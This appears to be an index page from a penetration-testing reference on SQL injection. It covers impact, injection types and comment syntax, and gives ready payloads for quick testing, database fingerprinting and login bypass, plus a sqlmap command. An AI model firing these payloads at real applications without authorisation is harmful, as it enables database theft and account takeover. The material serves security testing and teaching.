---
tags:
  - critical
  - server-side
---

# SQL Injection (SQLi)

SQL Injection allows attackers to manipulate database queries by injecting malicious SQL syntax into application inputs.

## Impact

- **Data theft** — Extract sensitive information from databases
- **Authentication bypass** — Login as any user without credentials
- **Data manipulation** — Modify, insert, or delete records
- **Server compromise** — Execute system commands (in some cases)

## Types

| Type | Description | Detection |
|------|-------------|-----------|
| **Union-based** | Combine results with attacker query | Output visible in response |
| **Error-based** | Extract data via error messages | Verbose errors enabled |
| **Blind (Boolean)** | Infer data from true/false responses | Different response for true/false |
| **Blind (Time)** | Infer data from response timing | No visible output |
| **Out-of-band** | Exfiltrate via DNS/HTTP requests | Network egress allowed |

## Quick Test

```sql
' OR 1=1-- -
' AND 1=2-- -
' AND SLEEP(5)-- -
```

## Database Fingerprinting

```sql
-- MySQL
' AND connection_id()=connection_id()--

-- PostgreSQL  
' AND 5::int=5--

-- MSSQL
' AND @@CONNECTIONS>0--

-- Oracle
' AND ROWNUM=ROWNUM--

-- SQLite
' AND sqlite_version()=sqlite_version()--
```

## Comment Syntax by Database

| Database | Comments |
|----------|----------|
| MySQL | `#`, `-- ` (space!), `/**/` |
| PostgreSQL | `--`, `/**/` |
| MSSQL | `--`, `/**/` |
| Oracle | `--`, `/**/` |

## Authentication Bypass

```sql
admin'--
' OR 1=1--
admin' OR '1'='1
' UNION SELECT 1,'admin','password'--
```

## In This Section

- [**find.md**](find.md) — Detection techniques and entry point identification
- [**exploit.md**](exploit.md) — Union-based and blind extraction methods
- [**bypasses.md**](bypasses.md) — WAF evasion techniques
- [**escalate.md**](escalate.md) — Data exfiltration and command execution

## Tools

- **sqlmap** — `sqlmap -u "URL?id=1" --dbs`
- **Caido** — Manual testing with Repeater
- **Havij** — GUI-based SQL injection
